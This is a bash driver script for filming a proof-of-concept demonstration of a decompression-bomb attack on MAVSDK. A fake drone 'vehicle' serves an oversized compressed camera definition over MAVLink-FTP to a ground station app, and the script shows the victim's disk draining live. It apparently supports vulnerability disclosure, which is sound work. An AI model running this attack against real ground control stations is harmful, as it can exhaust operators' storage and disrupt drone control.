#!/usr/bin/env bash
# MAVSDK-03 demo driver -- built for filming with TWO terminals side by side.
#
#   TERMINAL A (left, the attacker):   ./demo.sh vehicle [gib] [model] [vendor]
#   TERMINAL B (right, the operator):  ./demo.sh before
#                                      ./demo.sh run
#                                      ./demo.sh cache
#
# Everything runs inside one long-lived container so both panes talk over loopback.
set -euo pipefail
export DOCKER_CLI_HINTS=false
HERE="$(cd "$(dirname "$0")" && pwd)"
NAME=mavsdk03demo
# -t only when a terminal is attached, so the same script works when piped.
TTYF="-i"; [ -t 1 ] && TTYF="-it"
DEX="docker exec $TTYF $NAME bash -lc"

case "${1:-help}" in

up)
  docker rm -f "$NAME" >/dev/null 2>&1 || true
  docker run -d --name "$NAME" \
    -v "$HERE/poc_MAVSDK03_camera_definition_bomb.py:/poc/poc.py:ro" \
    mavsdk03-poc sleep infinity >/dev/null
  echo "container '$NAME' is up."
  ;;

# ---- TERMINAL A ----------------------------------------------------------
vehicle)
  GIB="${2:-1}"; MODEL="${3:-MAVSDK03}"; VENDOR="${4:-infected-drones}"
  # Kill any previous vehicle first. A stale one keeps port 5760 bound, which
  # makes the readiness check in `run` pass against the WRONG vehicle.
  docker exec -i "$NAME" bash -lc 'pkill -f poc.py 2>/dev/null; rm -f /work/harness.log' >/dev/null 2>&1 || true
  sleep 1
  $DEX "mkdir -p /work && cd /work; \
        python3 /poc/poc.py --mode bomb --gib $GIB \
          --model '$MODEL' --vendor '$VENDOR' \
          --bomb-cache /work/bomb-${GIB}gib.xz \
          --listen 0.0.0.0:5760 2>&1 | tee /work/harness.log"
  ;;

prebuild)
  # Build the bomb ONCE, off camera, and cache it. Without this the vehicle pane
  # spends ~60s of a 97s recording showing a progress bar.
  GIB="${2:-1}"
  echo "prebuilding the ${GIB} GiB bomb (this is the slow part -- do it off camera)"
  docker exec -i "$NAME" bash -lc 'pkill -f poc.py 2>/dev/null' >/dev/null 2>&1 || true
  sleep 1
  $DEX "cd /work; timeout 600 python3 /poc/poc.py --mode bomb --gib $GIB \
          --bomb-cache /work/bomb-${GIB}gib.xz --listen 0.0.0.0:5760 2>&1 \
        | while IFS= read -r l; do
            echo \"\$l\"
            case \"\$l\" in *'waiting for the GCS'*) pkill -f poc.py; break;; esac
          done"
  $DEX "ls -l /work/bomb-${GIB}gib.xz"
  echo "cached. './demo.sh vehicle ${GIB}' now comes up in ~1s."
  ;;

vehicle-control)
  $DEX "mkdir -p /work && cd /work; \
        python3 /poc/poc.py --mode control --listen 0.0.0.0:5760 2>&1 | tee /work/harness.log"
  ;;

# ---- TERMINAL B ----------------------------------------------------------
proof)
  $DEX "dpkg -s libmavsdk-dev | grep -E '^Package|^Version'; \
        echo; ldd /usr/local/bin/gcs_app | grep mavsdk"
  ;;

app-source)
  $DEX "cat /poc/gcs_app.cpp | sed -n '1,40p'" 2>/dev/null || sed -n '1,40p' "$HERE/gcs_app.cpp"
  ;;

before)
  $DEX "df -h /tmp | tail -1 | awk '{print \"disk: \" \$3 \" used, \" \$4 \" available\"}'; \
        echo -n 'camera cache: '; \
        ls -la ~/.cache/mavsdk/camera/ 2>/dev/null || echo '(empty -- nothing cached yet)'"
  ;;

# The money pane: baseline, launch the app in the background, watch the disk
# drain live against the FTP message count, then show the result.
run)
  $DEX "cd /work
        # Fail loudly instead of printing a silent row of zeros: without a vehicle
        # listening on 5760, gcs_app exits at once and the whole take is wasted.
        # Check the actual listening socket. (pgrep -f 'poc.py' is useless here:
        # this shell's own command line contains that string, so it matches itself.)
        # 5760 decimal == 0x1680; state 0A == LISTEN.
        listening() { awk '\$4==\"0A\" && \$2 ~ /:1680\$/ {found=1} END{exit !found}' /proc/net/tcp; }
        ready() { grep -q 'waiting for the GCS' /work/harness.log 2>/dev/null; }
        if ! listening || ! ready; then
          if listening && ! ready; then
            echo 'ERROR: something is listening on 5760 but this vehicle is not ready.'
            echo '       (a stale vehicle from an earlier take? re-run ./demo.sh vehicle 2)'
          else
          echo 'ERROR: nothing is listening on 5760, so there is no vehicle to talk to.'
          echo
          echo '  In the OTHER terminal run:   ./demo.sh vehicle 2'
          echo '  then WAIT until it prints:   waiting for the GCS to CONNECT'
          echo '  (building the .xz takes ~90s for 2 GiB -- it is not ready before that)'
          echo
          echo '  Also run ./demo.sh reset before each take: a warm cache makes'
          echo '  MAVSDK skip the download entirely.'
          fi
          exit 1
        fi
        rm -f /work/app.done /work/app.log /work/ftp_count
        # MiB, not -h: a 1-4 GiB drop is invisible when df rounds to whole GB.
        avail_mib() { df -BM --output=avail /tmp | tail -1 | tr -dc '0-9'; }
        used_b()    { df -B1 --output=used /tmp | tail -1 | tr -d ' '; }
        B0=\$(avail_mib); U0=\$(used_b)
        echo \"---- BEFORE ----   avail: \${B0} MiB\"
        echo
        echo '---- app starting (it only creates the Camera plugin) ----'
        ( gcs_app tcpout://127.0.0.1:5760 60 > /work/app.log 2>&1 ; touch /work/app.done ) &
        while [ ! -f /work/app.done ]; do
          # grep -c prints 0 AND exits 1 on no-match, so '|| echo 0' would print twice.
          MSGS=\$(cat /work/ftp_count 2>/dev/null || echo 0)
          A=\$(avail_mib)
          if grep -q 'Cached path' /work/app.log 2>/dev/null; then PH='done';
          elif grep -q 'finished to' /work/app.log 2>/dev/null; then PH='DECOMPRESSING';
          elif grep -q 'Download file' /work/app.log 2>/dev/null; then PH='transferring';
          else PH='idle'; fi
          printf '  %s  avail=%6s MiB  (-%5s MiB)  ftp_msgs=%-5s %s\n' \
            \"\$(date +%T)\" \"\$A\" \"\$((B0-A))\" \"\$MSGS\" \"\$PH\"
          sleep 0.5
        done
        U1=\$(used_b); A1=\$(avail_mib)
        echo
        echo \"---- AFTER ----    avail: \${A1} MiB\"
        echo \"  disk consumed by this run: \$(( (U1-U0)/1048576 )) MiB\"
        echo \"  wire cost: \$(cat /work/ftp_count 2>/dev/null || echo 0) MAVLink-FTP messages\"
        echo
        echo '---- what the app logged ----'
        if grep -qE 'Download file|finished to|Cached path' /work/app.log 2>/dev/null; then
          grep -E 'Download file|finished to|Cached path' /work/app.log | sed 's/^/  /'
        else
          echo '  (no download happened) -- app output was:'
          tail -6 /work/app.log 2>/dev/null | sed 's/^/  /'
          echo '  If it says \"Cache miss\" is absent, run ./demo.sh reset: a warm cache'
          echo '  short-circuits the download and nothing will be fetched.'
        fi"
  ;;

cache)
  $DEX "if [ -d ~/.cache/mavsdk/camera ]; then
          echo '~/.cache/mavsdk/camera/:'
          ls -la ~/.cache/mavsdk/camera/ | sed 's/^/  /'
          echo; echo 'total cached:'; du -sh ~/.cache/mavsdk/camera/ | sed 's/^/  /'
        else
          echo 'camera cache is empty -- no definition has been fetched yet.'
        fi"
  ;;

reset)
  $DEX "rm -rf ~/.cache/mavsdk/camera /tmp/mavsdk-component-metadata-* /work/app.log /work/app.done /work/ftp_count; \
        echo 'cache and temp dirs cleared (bomb cache kept)'"
  ;;

status)
  $DEX "echo -n 'vehicle listening on 5760: '
        awk '\$4==\"0A\" && \$2 ~ /:1680\$/ {f=1} END{print (f?\"YES\":\"no\")}' /proc/net/tcp
        echo -n 'vehicle ready (announced):  '
        grep -q 'waiting for the GCS' /work/harness.log 2>/dev/null && echo YES || echo no
        echo -n 'camera cache:               '
        [ -d ~/.cache/mavsdk/camera ] && du -sh ~/.cache/mavsdk/camera | cut -f1 || echo empty"
  ;;

down)
  docker rm -f "$NAME" >/dev/null 2>&1 || true; echo "container removed"
  ;;

*)
  sed -n '2,12p' "$0"
  ;;
esac
